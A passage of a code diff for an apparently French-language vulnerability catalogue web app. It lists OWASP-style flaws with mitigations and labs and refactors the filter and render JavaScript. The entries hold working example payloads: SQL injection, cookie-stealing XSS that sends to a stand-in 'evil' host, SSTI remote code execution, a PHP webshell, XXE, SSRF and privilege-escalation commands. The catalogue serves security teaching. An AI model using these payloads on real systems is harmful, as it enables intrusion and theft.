algorithm server-side. Strong secrets / asymmetric. Validate kid.", "lab": "PortSwigger JWT, jwt.io", "status": "still-works"}, {"id": "ssti", "name": "Server-Side Template Injection", "category": "Injection", "cwe": "CWE-94", "owasp": "A05:2025", "severity": "critical", "targets": ["web"], "os": ["any"], "description": "Template engine évalue input utilisateur → RCE (Jinja2, Twig, Freemarker...).", "how": "{{7*7}}, ${7*7}, <%= 7*7 %>. Puis payloads RCE.", "example": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n${T(java.lang.Runtime).getRuntime().exec('id')}", "tools": ["tplmap", "SSTImap"], "mitigation": "Sandbox templates. Ne jamais concat user input dans templates. Logic-less engines.", "lab": "PortSwigger SSTI", "status": "still-works"}, {"id": "prototype-pollution", "name": "Prototype Pollution (JS)", "category": "Injection", "cwe": "CWE-1321", "owasp": "A05:2025", "severity": "high", "targets": ["web", "api"], "os": ["any"], "description": "Pollution de Object.prototype via merge / parse non safe → escalade, XSS, RCE selon contexte.", "how": "{\"__proto__\":{\"isAdmin\":true}} ou constructor.prototype.", "example": "JSON merge libraries vulnérables. lodash, jQuery, etc. historiques.", "tools": ["manual", "Burp", "ppmap"], "mitigation": "Object.create(null). freeze. Libraries patched. Validate keys.", "lab": "PortSwigger Prototype Pollution", "status": "still-works"}];
+const VULNS = [{"id": "sqli-classic", "name": "SQL Injection (Classic)", "category": "Injection", "cwe": "CWE-89", "owasp": "A05:2025", "severity": "critical", "targets": ["web", "api"], "os": ["any"], "description": "Injection de requêtes SQL non filtrées via paramètres utilisateur. Permet lecture/écriture DB, parfois RCE via xp_cmdshell ou INTO OUTFILE.", "how": "Payloads dans GET/POST/headers/cookies. Union-based, error-based, boolean blind, time-based.", "example": "' OR 1=1--\n' UNION SELECT null,username,password FROM users--\n1' AND SLEEP(5)--", "tools": ["sqlmap", "Burp Suite", "NoSQLMap"], "mitigation": "Prepared statements / parameterized queries. ORM. Whitelist input. Least privilege DB user.", "lab": "DVWA, SQLi-Labs, PortSwigger Academy", "status": "still-works"}, {"id": "xss-reflected", "name": "Cross-Site Scripting (Reflected)", "category": "Injection", "cwe": "CWE-79", "owasp": "A05:2025", "severity": "high", "targets": ["web"], "os": ["any"], "description": "Script malveillant réfléchi dans la réponse HTTP. Vol de session, keylogging, phishing in-app.", "how": "Paramètre réfléchi sans encoding. <script>, event handlers, SVG onload.", "example": "<script>document.location='https://evil/?c='+document.cookie<\/script>\n\"><img src=x onerror=alert(1)>\n<svg/onload=alert(1)>", "tools": ["XSStrike", "Burp", "dalfox", "XSS Hunter"], "mitigation": "Output encoding context-aware. CSP strict. HttpOnly cookies. Sanitize HTML.", "lab": "PortSwigger XSS labs, DVWA", "status": "still-works"}, {"id": "xss-stored", "name": "Cross-Site Scripting (Stored)", "category": "Injection", "cwe": "CWE-79", "owasp": "A05:2025", "severity": "critical", "targets": ["web"], "os": ["any"], "description": "Payload persisté en base / fichier / commentaire. Frappe tous les visiteurs.", "how": "Champs non sanitizés (commentaires, profils, noms de fichiers).", "example": "<script>fetch('https://evil/steal?c='+btoa(document.cookie))<\/script>", "tools": ["Burp", "BeEF", "XSS Hunter"], "mitigation": "Sanitize + encode. CSP. Input validation côté serveur.", "lab": "DVWA, bWAPP", "status": "still-works"}, {"id": "xss-dom", "name": "DOM-based XSS", "category": "Injection", "cwe": "CWE-79", "owasp": "A05:2025", "severity": "high", "targets": ["web"], "os": ["any"], "description": "Source client (location, hash, postMessage) écrite dans un sink dangereux (innerHTML, eval, document.write).", "how": "Analyse sources → sinks. #hash, searchParams, localStorage.", "example": "location.hash → document.write / innerHTML\neval(location.search)", "tools": ["DOM Invader (Burp)", "DOMPurify audit"], "mitigation": "Éviter sinks dangereux. DOMPurify. Trusted Types.", "lab": "PortSwigger DOM XSS", "status": "still-works"}, {"id": "cmdi", "name": "OS Command Injection", "category": "Injection", "cwe": "CWE-78", "owasp": "A05:2025", "severity": "critical", "targets": ["web", "app"], "os": ["windows", "linux", "macos", "kali"], "description": "Commandes système construites avec input utilisateur non échappé. RCE full.", "how": "; | & ` $() sur Linux. & | sur Windows.", "example": "; id\n| whoami\n& dir\n`cat /etc/passwd`", "tools": ["Commix", "Burp"], "mitigation": "Éviter shell. APIs natives. Escape strict + whitelist.", "lab": "DVWA Command Injection, HackTheBox", "status": "still-works"}, {"id": "ssrf", "name": "Server-Side Request Forgery", "category": "Broken Access Control", "cwe": "CWE-918", "owasp": "A01:2025", "severity": "high", "targets": ["web", "api", "cloud"], "os": ["any"], "description": "Serveur fait des requêtes vers des URL contrôlées. Accès réseau interne, cloud metadata, ports.", "how": "URL params, webhooks, PDF generators, image fetchers.", "example": "http://169.254.169.254/latest/meta-data/\nhttp://127.0.0.1:6379/\nfile:///etc/passwd", "tools": ["SSRFmap", "Gopherus", "Burp Collaborator"], "mitigation": "Whitelist destinations. Bloquer IP privées / link-local. Network segmentation.", "lab": "PortSwigger SSRF, CloudGoat", "status": "still-works"}, {"id": "xxe", "name": "XML External Entity (XXE)", "category": "Injection", "cwe": "CWE-611", "owasp": "A05:2025", "severity": "high", "targets": ["web", "api"], "os": ["any"], "description": "Parser XML résout des entités externes. Lecture fichiers, SSRF, parfois RCE (Java).", "how": "DOCTYPE + SYSTEM entity dans XML body / upload.", "example": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;<\/foo>", "tools": ["xxeinjector", "Burp"], "mitigation": "Désactiver DTD / external entities. Parser safe (defusedxml).", "lab": "PortSwigger XXE", "status": "still-works"}, {"id": "idor", "name": "Insecure Direct Object Reference (IDOR)", "category": "Broken Access Control", "cwe": "CWE-639", "owasp": "A01:2025", "severity": "high", "targets": ["web", "api"], "os": ["any"], "description": "Accès à des objets via ID prévisible sans check d'ownership.", "how": "Changer /user/123 → /user/124. UUID vs sequential.", "example": "GET /api/orders/1001 → changer en 1002\nPUT /api/users/me → /api/users/admin", "tools": ["Burp Autorize", "Autorize extension"], "mitigation": "AuthZ côté serveur par objet. UUID non prévisibles. Tests d'accès croisés.", "lab": "PortSwigger Access Control, DVWA", "status": "still-works"}, {"id": "csrf", "name": "Cross-Site Request Forgery", "category": "Broken Access Control", "cwe": "CWE-352", "owasp": "A01:2025", "severity": "medium", "targets": ["web"], "os": ["any"], "description": "Requête authentifiée forgée depuis un site tiers. Actions non désirées.", "how": "Form auto-submit, img src, fetch with credentials.", "example": "<form action=\"https://bank/transfer\" method=\"POST\"><input name=\"to\" value=\"evil\"><input name=\"amount\" value=\"1000\"><\/form><script>document.forms[0].submit()<\/script>", "tools": ["Burp CSRF PoC generator"], "mitigation": "CSRF tokens synchronizer. SameSite=Strict cookies. Origin/Referer check.", "lab": "PortSwigger CSRF", "status": "still-works"}, {"id": "auth-bypass", "name": "Authentication Bypass", "category": "Authentication Failures", "cwe": "CWE-287", "owasp": "A07:2025", "severity": "critical", "targets": ["web", "api", "app"], "os": ["any"], "description": "Failles de login : default creds, weak JWT, logic flaws, response manipulation.", "how": "Brute force, JWT none/alg confusion, mass assignment, SQLi in login.", "example": "JWT header {\"alg\":\"none\"}\nadmin'--\n{\"role\":\"admin\"} mass assignment", "tools": ["jwt_tool", "Hydra", "Burp"], "mitigation": "MFA. Rate limit. Secure JWT (RS256). AuthZ séparé de AuthN.", "lab": "PortSwigger Auth labs, Juice Shop", "status": "still-works"}, {"id": "path-traversal", "name": "Path Traversal / LFI", "category": "Broken Access Control", "cwe": "CWE-22", "owasp": "A01:2025", "severity": "high", "targets": ["web", "app"], "os": ["windows", "linux", "macos", "kali"], "description": "Accès fichiers hors répertoire prévu via ../ ou null bytes.", "how": "../../../etc/passwd, ..\\..\\windows\\win.ini, wrappers php://filter", "example": "....//....//etc/passwd\nphp://filter/convert.base64-encode/resource=index.php\n/proc/self/environ", "tools": ["dotdotpwn", "Burp"], "mitigation": "Canonicalize paths. Whitelist fichiers. Chroot / sandbox.", "lab": "DVWA File Inclusion, PortSwigger", "status": "still-works"}, {"id": "rce-upload", "name": "Unrestricted File Upload → RCE", "category": "Injection", "cwe": "CWE-434", "owasp": "A05:2025", "severity": "critical", "targets": ["web"], "os": ["linux", "windows", "kali"], "description": "Upload de webshell / polyglot. Extension bypass, content-type, double extension.", "how": ".php.jpg, null byte, magic bytes, .htaccess, SVG XSS.", "example": "shell.php / shell.php%00.jpg / shell.phtml\nGIF89a; <?php system($_GET['c']); ?>", "tools": ["Burp", "weevely", "China Chopper"], "mitigation": "Whitelist extensions. Store hors webroot. Rename random. Content scan. Disable execution in upload dir.", "lab": "DVWA Upload, HackTheBox", "status": "still-works"}, {"id": "deserial", "name": "Insecure Deserialization", "category": "Software or Data Integrity Failures", "cwe": "CWE-502", "owasp": "A08:2025", "severity": "critical", "targets": ["web", "app"], "os": ["any"], "description": "Désérialisation d'objets non trusted → RCE (Java, PHP, .NET, Python pickle).", "how": "Cookie / param sérialisé. Gadgets ysoserial / phpggc.", "example": "Java: ysoserial CommonsCollections\nPHP: phpggc Laravel/RCE\nPython: pickle.loads(malicious)", "tools": ["ysoserial", "phpggc", "pickle tools"], "mitigation": "Éviter désérialisation non trusted. Whitelist classes. JSON only.", "lab": "PortSwigger Deserialization, Java labs", "status": "still-works"}, {"id": "misconfig", "name": "Security Misconfiguration", "category": "Security Misconfiguration", "cwe": "CWE-16", "owasp": "A02:2025", "severity": "high", "targets": ["web", "api", "cloud", "app"], "os": ["any"], "description": "Defaults, debug on, headers manquants, cloud buckets ouverts, admin panels exposés.", "how": "Directory listing, stack traces, default passwords, CORS * + credentials.", "example": "/.env, /server-status, S3 public, debug=true, X-Powered-By", "tools": ["nikto", "nuclei", "cloud_enum"], "mitigation": "Hardening guides. Remove defaults. Security headers. Least privilege cloud.", "lab": "Juice Shop, CloudGoat", "status": "still-works"}, {"id": "crypto-fail", "name": "Cryptographic Failures", "category": "Cryptographic Failures", "cwe": "CWE-310", "owasp": "A04:2025", "severity": "high", "targets": ["web", "app", "api"], "os": ["any"], "description": "Crypto faible, clés hardcodées, TLS mal configuré, hashing unsalted / MD5.", "how": "HTTP au lieu de HTTPS, weak ciphers, JWT HS256 avec secret faible.", "example": "MD5(password), ECB mode, private key in repo, SSL strip", "tools": ["testssl.sh", "hashcat", "jwt_tool"], "mitigation": "TLS 1.2+, strong ciphers. Argon2/bcrypt. Secrets management. HSTS.", "lab": "Crypto challenges CTF, PortSwigger", "status": "still-works"}, {"id": "supply-chain", "name": "Software Supply Chain Failures", "category": "Software Supply Chain Failures", "cwe": "CWE-1104", "owasp": "A03:2025", "severity": "critical", "targets": ["web", "app", "ci"], "os": ["any"], "description": "Dépendances compromises, typosquatting, malicious packages, build pipeline hijack.", "how": "npm/pip install malicious, compromised maintainer, CI secrets leak.", "example": "event-stream incident, SolarWinds, codecov, dependency confusion", "tools": ["npm audit", "snyk", "dependabot", "socket.dev"], "mitigation": "Lockfiles + integrity. SBOM. Pin versions. Private registry. Review CI permissions.", "lab": "OWASP Dependency-Track demos", "status": "still-works"}, {"id": "logging-fail", "name": "Security Logging & Alerting Failures", "category": "Security Logging and Alerting Failures", "cwe": "CWE-778", "owasp": "A09:2025", "severity": "medium", "targets": ["web", "app", "api"], "os": ["any"], "description": "Pas de logs utiles, ou logs non monitorés. Impossible de détecter ou investiguer.", "how": "Login failures non loggés, pas d'alerte brute force, logs en local non centralisés.", "example": "Pas de SIEM, logs rotation trop agressive, credentials dans logs", "tools": ["ELK", "Splunk", "Wazuh", "Fail2ban"], "mitigation": "Log auth events, access denied, input anomalies. Centralize + alert. Protect log integrity.", "lab": "SIEM labs, Blue Team labs", "status": "still-works"}, {"id": "insecure-design", "name": "Insecure Design", "category": "Insecure Design", "cwe": "CWE-1039", "owasp": "A06:2025", "severity": "high", "targets": ["web", "app", "api"], "os": ["any"], "description": "Faille d'architecture / business logic. Code correct mais design dangereux.", "how": "Race conditions, missing rate limit sur actions critiques, trust client-side only.", "example": "Coupon réutilisable, race transfer argent, password reset without token binding", "tools": ["Threat modeling (STRIDE)", "manual logic testing"], "mitigation": "Threat modeling early. Secure design patterns. Business logic tests.", "lab": "PortSwigger Business Logic, Juice Shop", "status": "still-works"}, {"id": "exception-mishandle", "name": "Mishandling of Exceptional Conditions", "category": "Mishandling of Exceptional Conditions", "cwe": "CWE-755", "owasp": "A10:2025", "severity": "medium", "targets": ["web", "app", "api"], "os": ["any"], "description": "Exceptions non gérées → info leak, DoS, état incohérent, bypass de checks.", "how": "Stack traces exposées, fail-open, uncaught exceptions in auth flow.", "example": "500 avec path + query, catch vide qui continue, timeout qui skip validation", "tools": ["manual fuzzing", "Burp Intruder"], "mitigation": "Fail closed. Generic error pages. Structured exception handling. Chaos testing.", "lab": "Custom apps, fuzzing labs", "status": "still-works"}, {"id": "clickjacking", "name": "Clickjacking / UI Redress", "category": "Broken Access Control", "cwe": "CWE-1021", "owasp": "A01:2025", "severity": "medium", "targets": ["web"], "os": ["any"], "description": "Iframe transparent superposé. Clic utilisateur déclenche action non désirée.", "how": "iframe opacity 0 + position absolute sur bouton sensible.", "example": "<iframe src=\"https://bank/delete\" style=\"opacity:0;position:absolute\"><\/iframe>", "tools": ["Burp Clickbandit"], "mitigation": "X-Frame-Options DENY / SAMEORIGIN. CSP frame-ancestors. JS framebusting (fallback).", "lab": "PortSwigger Clickjacking", "status": "still-works"}, {"id": "open-redirect", "name": "Open Redirect", "category": "Broken Access Control", "cwe": "CWE-601", "owasp": "A01:2025", "severity": "low", "targets": ["web"], "os": ["any"], "description": "Redirection vers URL externe non validée. Phishing / OAuth token steal.", "how": "?next=https://evil.com, //evil.com, javascript:", "example": "/login?redirect=https://evil.com\n/?url=//evil.com/%2f%2e%2e", "tools": ["manual", "Burp"], "mitigation": "Whitelist domaines. Relative paths only. Encode redirects.", "lab": "PortSwigger Open Redirect", "status": "still-works"}, {"id": "win-potato", "name": "Windows Potato Family (PrivEsc)", "category": "Privilege Escalation", "cwe": "CWE-269", "owasp": null, "severity": "critical", "targets": ["os"], "os": ["windows"], "description": "Abus de tokens / impersonation (SeImpersonatePrivilege) pour monter SYSTEM. JuicyPotato, RoguePotato, GodPotato, etc.", "how": "Service ou process avec SeImpersonate → trigger DCOM/RPC → vol token SYSTEM.", "example": "GodPotato -cmd \"cmd /c whoami\"\nJuicyPotato -t * -p cmd.exe -a \"/c whoami\"", "tools": ["GodPotato", "JuicyPotatoNG", "PrintSpoofer", "RoguePotato"], "mitigation": "Patch. Réduire SeImpersonate. Hardening services. AppLocker / WDAC.", "lab": "HackTheBox Windows boxes, TryHackMe", "status": "still-works"}, {"id": "win-unquoted", "name": "Unquoted Service Path", "category": "Privilege Escalation", "cwe": "CWE-428", "owasp": null, "severity": "high", "targets": ["os"], "os": ["windows"], "description": "Chemin de service non quoté avec espaces. Hijack possible si writable.", "how": "C:\\Program Files\\App\\service.exe → créer C:\\Program.exe", "example": "wmic service get name,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"", "tools": ["PowerUp", "WinPEAS", "accesschk"], "mitigation": "Quotes autour des chemins. Permissions strictes sur dossiers parents.", "lab": "Windows PrivEsc rooms", "status": "still-works"}, {"id": "win-alwaysinstallelevated", "name": "AlwaysInstallElevated", "category": "Privilege Escalation", "cwe": "CWE-250", "owasp": null, "severity": "high", "targets": ["os"], "os": ["windows"], "description": "MSI installés avec privilèges SYSTEM si policy activée (HKLM + HKCU).", "how": "Créer MSI malveillant → msiexec /quiet /i evil.msi", "example": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nmsfvenom -p windows/adduser -f msi > evil.msi", "tools": ["msfvenom", "PowerUp"], "mitigation": "Désactiver AlwaysInstallElevated. GPO.", "lab": "Windows PrivEsc labs", "status": "still-works"}, {"id": "linux-suid", "name": "SUID / SGID Binary Abuse", "category": "Privilege Escalation", "cwe": "CWE-732", "owasp": null, "severity": "critical", "targets": ["os"], "os": ["linux", "kali"], "description": "Binaires SUID exécutés en root. GTFOBins pour escalation.", "how": "find / -perm -4000. Abuse via known binaries (find, vim, nmap, python...).", "example": "find / -perm -4000 2>/dev/null\n./nmap --interactive\n!sh", "tools": ["LinPEAS", "GTFOBins", "pspy"], "mitigation": "Minimiser SUID. Capabilities préférées. AppArmor/SELinux.", "lab": "Linux PrivEsc, HackTheBox", "status": "still-works"}, {"id": "linux-sudo", "name": "Sudo Misconfiguration", "category": "Privilege Escalation", "cwe": "CWE-250", "owasp": null, "severity": "critical", "targets": ["os"], "os": ["linux", "kali"], "description": "sudo -l montre commandes autorisées sans password ou avec wildcards dangereux.", "how": "sudo vim → :!sh. LD_PRELOAD. Path bypass. CVE-2023-22809 sudoedit.", "example": "sudo -l\nsudo vim /etc/hosts → :!bash\nSUDO_EDITOR='vim -- /etc/sudoers' sudoedit /tmp/x", "tools": ["LinPEAS", "GTFOBins"], "mitigation": "sudoers strict, no wildcards, no env_keep dangereux. visudo.", "lab": "Linux PrivEsc rooms", "status": "still-works"}, {"id": "linux-kernel", "name": "Linux Kernel Exploits (Dirty Pipe, PwnKit, etc.)", "category": "Privilege Escalation", "cwe": "CWE-269", "owasp": null, "severity": "critical", "targets": ["os"], "os": ["linux", "kali"], "description": "Vulns kernel historiques et récentes : Dirty COW, Dirty Pipe, PwnKit (pkexec), netfilter, eBPF.", "how": "uname -a → chercher CVE. Compiler PoC local.", "example": "CVE-2022-0847 Dirty Pipe\nCVE-2021-4034 PwnKit\nCVE-2021-22555 netfilter", "tools": ["linux-exploit-suggester", "LinPEAS", "pocs public"], "mitigation": "Kernel à jour. Unprivileged user namespaces off si possible. Hardening.", "lab": "HackTheBox kernel boxes", "status": "still-works"}, {"id": "macos-tcc", "name": "macOS TCC / Privacy Bypass", "category": "Privilege Escalation", "cwe": "CWE-284", "owasp": null, "severity": "high", "targets": ["os"], "os": ["macos"], "description": "Bypass Transparency, Consent, and Control (TCC). Accès photos, contacts, caméra sans consentement.", "how": "Vulns dans tccd, XPC, entitlements, Injection dans process trusted.", "example": "Historique : CVE-2020-9771, CVE-2021-30970, etc. Techniques évoluent avec chaque OS.", "tools": ["research PoCs", "objective-see tools"], "mitigation": "macOS à jour. SIP on. Réduire apps avec entitlements sensibles.", "lab": "macOS security research writeups", "status": "version-dependent"}, {"id": "macos-gatekeeper", "name": "Gatekeeper / Notarization Bypass", "category": "Privilege Escalation", "cwe": "CWE-693", "owasp": null, "severity": "high", "targets": ["os", "app"], "os": ["macos"], "description": "Techniques pour exécuter code non signé / non notarisé en contournant Gatekeeper.", "how": "Archive tricks, symlink, environment variables, older CVE still relevant on lagging systems.", "example": "CVE-2021-30657, CVE-2022-22616, etc.", "tools": ["public research"], "mitigation": "macOS à jour. Ne pas désactiver Gatekeeper. Notarization.", "lab": "Objective-See blog, conference talks", "status": "version-dependent"}, {"id": "kali-tools-abuse", "name": "Kali / Pentest Tools Misuse Surface", "category": "Security Misconfiguration", "cwe": "CWE-250", "owasp": null, "severity": "medium", "targets": ["os"], "os": ["kali"], "description": "Kali shippe des outils puissants. Mauvais usage / config laisse des services exposés (Metasploit, databases, listeners).", "how": "Services démarrés par défaut en lab, credentials par défaut, ports ouverts.", "example": "postgresql default, metasploit db, open listeners, weak SSH", "tools": ["systemctl", "ss -tlnp", "default-creds"], "mitigation": "Hardening Kali pour usage réel. Firewall. Changer defaults. Isolation réseau.", "lab": "Kali hardening guides", "status": "config-dependent"}, {"id": "api-bola", "name": "API Broken Object Level Authorization (BOLA)", "category": "Broken Access Control", "cwe": "CWE-639", "owasp": "A01:2025", "severity": "critical", "targets": ["api"], "os": ["any"], "description": "Équivalent IDOR pour APIs. Object ID manipulable sans check ownership.", "how": "Changer resource ID dans path / body / GraphQL.", "example": "GET /api/v1/users/1337/orders → 1338\nGraphQL { user(id:\"other\") { email } }", "tools": ["Burp", "Postman", "GraphQL voyager"], "mitigation": "AuthZ par objet systématique. Tests automatisés d'accès croisés.", "lab": "API Security Top 10 labs, crAPI", "status": "still-works"}, {"id": "api-mass-assignment", "name": "API Mass Assignment", "category": "Broken Access Control", "cwe": "CWE-915", "owasp": "A01:2025", "severity": "high", "targets": ["api"], "os": ["any"], "description": "Binding automatique de propriétés non prévues (role, isAdmin, balance).", "how": "Ajouter champs dans JSON body non filtrés.", "example": "{\"email\":\"x\",\"role\":\"admin\",\"isPremium\":true}", "tools": ["Burp", "manual"], "mitigation": "Whitelist fields. DTOs stricts. Never bind whole object.", "lab": "OWASP API Top 10 labs", "status": "still-works"}, {"id": "race-condition", "name": "Race Condition / TOCTOU", "category": "Insecure Design", "cwe": "CWE-362", "owasp": "A06:2025", "severity": "high", "targets": ["web", "api", "app"], "os": ["any"], "description": "Time-of-check vs time-of-use. Double-spend, coupon reuse, limit bypass.", "how": "Requêtes parallèles rapides sur action limitée.", "example": "2x transfer simultané, redeem coupon en parallèle", "tools": ["Turbo Intruder", "Burp race", "ffuf concurrent"], "mitigation": "Locks atomiques. Idempotency keys. Transactions DB.", "lab": "PortSwigger Race Conditions", "status": "still-works"}, {"id": "jwt-attacks", "name": "JWT Attacks", "category": "Authentication Failures", "cwe": "CWE-347", "owasp": "A07:2025", "severity": "high", "targets": ["web", "api"], "os": ["any"], "description": "none algorithm, alg confusion (RS→HS), weak secret, kid injection, jku.", "how": "Modifier header + signature. Crack HS256. Force none.", "example": "{\"alg\":\"none\"} + empty sig\nRS256 public key as HS256 secret\nkid: ../../dev/null", "tools": ["jwt_tool", "hashcat", "Burp JWT Editor"], "mitigation": "Force algorithm server-side. Strong secrets / asymmetric. Validate kid.", "lab": "PortSwigger JWT, jwt.io", "status": "still-works"}, {"id": "ssti", "name": "Server-Side Template Injection", "category": "Injection", "cwe": "CWE-94", "owasp": "A05:2025", "severity": "critical", "targets": ["web"], "os": ["any"], "description": "Template engine évalue input utilisateur → RCE (Jinja2, Twig, Freemarker...).", "how": "{{7*7}}, ${7*7}, <%= 7*7 %>. Puis payloads RCE.", "example": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n${T(java.lang.Runtime).getRuntime().exec('id')}", "tools": ["tplmap", "SSTImap"], "mitigation": "Sandbox templates. Ne jamais concat user input dans templates. Logic-less engines.", "lab": "PortSwigger SSTI", "status": "still-works"}, {"id": "prototype-pollution", "name": "Prototype Pollution (JS)", "category": "Injection", "cwe": "CWE-1321", "owasp": "A05:2025", "severity": "high", "targets": ["web", "api"], "os": ["any"], "description": "Pollution de Object.prototype via merge / parse non safe → escalade, XSS, RCE selon contexte.", "how": "{\"__proto__\":{\"isAdmin\":true}} ou constructor.prototype.", "example": "JSON merge libraries vulnérables. lodash, jQuery, etc. historiques.", "tools": ["manual", "Burp", "ppmap"], "mitigation": "Object.create(null). freeze. Libraries patched. Validate keys.", "lab": "PortSwigger Prototype Pollution", "status": "still-works"}];
 
 const OS = [
   { id: "any", label: "Tous OS" },
@@ -242,111 +280,157 @@ const TARGETS = [
 const SEVS = ["all", "critical", "high", "medium", "low"];
 const SEV_ORDER = { critical: 0, high: 1, medium: 2, low: 3 };
 
-let state = { q: "", os: "any", target: "all", severity: "all", category: "all" };
+var state = { q: "", os: "any", target: "all", severity: "all", category: "all" };
 
-const cats = ["all", ...[...new Set(VULNS.map(v => v.category))].sort()];
+var catSet = {};
+for (var i = 0; i < VULNS.length; i++) catSet[VULNS[i].category] = true;
+var cats = ["all"].concat(Object.keys(catSet).sort());
 
 function esc(s) {
-  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+  return String(s == null ? "" : s)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
 }
 
 function renderFilters() {
-  document.getElementById("osFilters").innerHTML = OS.map(o =>
-    `<button type="button" class="btn ${state.os===o.id?"active":""}" data-os="${o.id}">${esc(o.label)}</button>`
-  ).join("");
-  document.getElementById("targetFilters").innerHTML = TARGETS.map(t =>
-    `<button type="button" class="chip ${state.target===t.id?"active":""}" data-target="${t.id}">${esc(t.label)}</button>`
-  ).join("");
-  document.getElementById("sevFilters").innerHTML = SEVS.map(s => {
-    let cls = "chip";
+  var html = "";
+  for (var i = 0; i < OS.length; i++) {
+    var o = OS[i];
+    html += '<button type="button" class="btn' + (state.os === o.id ? " active" : "") + '" data-os="' + o.id + '">' + esc(o.label) + "</button>";
+  }
+  document.getElementById("osFilters").innerHTML = html;
+
+  html = "";
+  for (var i = 0; i < TARGETS.length; i++) {
+    var t = TARGETS[i];
+    html += '<button type="button" class="chip' + (state.target === t.id ? " on" : "") + '" data-target="' + t.id + '">' + esc(t.label) + "</button>";
+  }
+  document.getElementById("targetFilters").innerHTML = html;
+
+  html = "";
+  for (var i = 0; i < SEVS.length; i++) {
+    var s = SEVS[i];
+    var cls = "chip";
     if (state.severity === s) {
-      cls += s === "critical" ? " active-crit" : s === "high" ? " active-high" : s === "medium" ? " active-med" : s === "low" ? " active-low" : " active";
+      if (s === "critical") cls += " on-crit";
+      else if (s === "high") cls += " on-high";
+      else if (s === "medium") cls += " on-med";
+      else if (s === "low") cls += " on-low";
+      else cls += " on";
     }
-    return `<button type="button" class="${cls}" data-sev="${s}">${s}</button>`;
-  }).join("");
-  document.getElementById("catFilters").innerHTML = cats.map(c =>
-    `<button type="button" class="btn ${state.category===c?"active":""}" data-cat="${c}">${c==="all"?"Toutes":esc(c)}</button>`
-  ).join("");
+    html += '<button type="button" class="' + cls + '" data-sev="' + s + '">' + s + "</button>";
+  }
+  document.getElementById("sevFilters").innerHTML = html;
+
+  html = "";
+  for (var i = 0; i < cats.length; i++) {
+    var c = cats[i];
+    html += '<button type="button" class="btn' + (state.category === c ? " active" : "") + '" data-cat="' + esc(c) + '">' + (c === "all" ? "Toutes" : esc(c)) + "</button>";
+  }
+  document.getElementById("catFilters").innerHTML = html;
 }
 
 function filtered() {
-  const q = state.q.trim().toLowerCase();
-  return VULNS.filter(v => {
-    if (state.os !== "any" && !v.os.includes("any") && !v.os.includes(state.os)) return false;
-    if (state.target !== "all" && !v.targets.includes(state.target)) return false;
-    if (state.severity !== "all" && v.severity !== state.severity) return false;
-    if (state.category !== "all" && v.category !== state.category) return false;
-    if (!q) return true;
-    const blob = [v.name, v.description, v.category, v.cwe, v.owasp||"", v.how, v.example, ...(v.tools||[])].join(" ").toLowerCase();
-    return blob.includes(q);
-  }).sort((a,b) => SEV_ORDER[a.severity] - SEV_ORDER[b.severity]);
+  var q = state.q.trim().toLowerCase();
+  var out = [];
+  for (var i = 0; i < VULNS.length; i++) {
+    var v = VULNS[i];
+    if (state.os !== "any" && v.os.indexOf("any") === -1 && v.os.indexOf(state.os) === -1) continue;
+    if (state.target !== "all" && v.targets.indexOf(state.target) === -1) continue;
+    if (state.severity !== "all" && v.severity !== state.severity) continue;
+    if (state.category !== "all" && v.category !== state.category) continue;
+    if (q) {
+      var blob = [v.name, v.description, v.category, v.cwe, v.owasp || "", v.how, v.example].join(" ");
+      if (v.tools) blob += " " + v.tools.join(" ");
+      if (blob.toLowerCase().indexOf(q) === -1) continue;
+    }
+    out.push(v);
+  }
+  out.sort(function (a, b) {
+    return SEV_ORDER[a.severity] - SEV_ORDER[b.severity];
+  });
+  return out;
 }
 
 function renderGrid() {
-  const list = filtered();
-  document.getElementById("stats").innerHTML =
-    `<span><b style="color:var(--text)">${list.length}</b> / ${VULNS.length} fails</span>` +
-    (state.os !== "any" ? `<span style="color:var(--accent);border-color:rgba(124,58,237,.3)">filter: ${esc(state.os)}</span>` : "") +
-    `<span style="color:var(--muted)">· cliquer une carte pour le détail</span>`;
-  document.getElementById("totalCount").textContent = VULNS.length;
-  const grid = document.getElementById("grid");
-  const empty = document.getElementById("empty");
+  var list = filtered();
+  var statsHtml = '<span><b style="color:var(--text)">' + list.length + "</b> / " + VULNS.length + " fails</span>";
+  if (state.os !== "any") {
+    statsHtml += '<span style="color:var(--accent);border-color:rgba(124,58,237,.3)">filter: ' + esc(state.os) + "</span>";
+  }
+  statsHtml += '<span style="color:var(--muted)">· cliquer une carte pour le détail</span>';
+  document.getElementById("stats").innerHTML = statsHtml;
+  document.getElementById("totalCount").textContent = String(VULNS.length);
+
+  var grid = document.getElementById("grid");
+  var empty = document.getElementById("empty");
   if (!list.length) {
     grid.innerHTML = "";
     empty.style.display = "block";
     return;
   }
   empty.style.display = "none";
-  grid.innerHTML = list.map(v => `
-    <button type="button" class="card" data-id="${esc(v.id)}">
-      <div class="badges">
-        <span class="badge sev-${v.severity}">${v.severity}</span>
-        ${v.owasp ? `<span class="badge badge-dim">${esc(v.owasp)}</span>` : ""}
-        <span class="badge badge-dim">${esc(v.status)}</span>
-      </div>
-      <h3>${esc(v.name)}</h3>
-      <p>${esc(v.description)}</p>
-      <div class="tags">
-        ${v.os.map(o => `<span class="tag">${esc(o)}</span>`).join("")}
-        ${v.targets.slice(0,3).map(t => `<span class="tag">${esc(t)}</span>`).join("")}
-      </div>
-    </button>
-  `).join("");
+
+  var html = "";
+  for (var i = 0; i < list.length; i++) {
+    var v = list[i];
+    html += '<button type="button" class="card" data-id="' + esc(v.id) + '">';
+    html += '<div class="badges">';
+    html += '<span class="badge sev-' + v.severity + '">' + v.severity + "</span>";
+    if (v.owasp) html += '<span class="badge badge-dim">' + esc(v.owasp) + "</span>";
+    html += '<span class="badge badge-dim">' + esc(v.status) + "</span>";
+    html += "</div>";
+    html += "<h3>" + esc(v.name) + "</h3>";
+    html += "<p>" + esc(v.description) + "</p>";
+    html += '<div class="tags">';
+    for (var j = 0; j < v.os.length; j++) html += '<span class="tag">' + esc(v.os[j]) + "</span>";
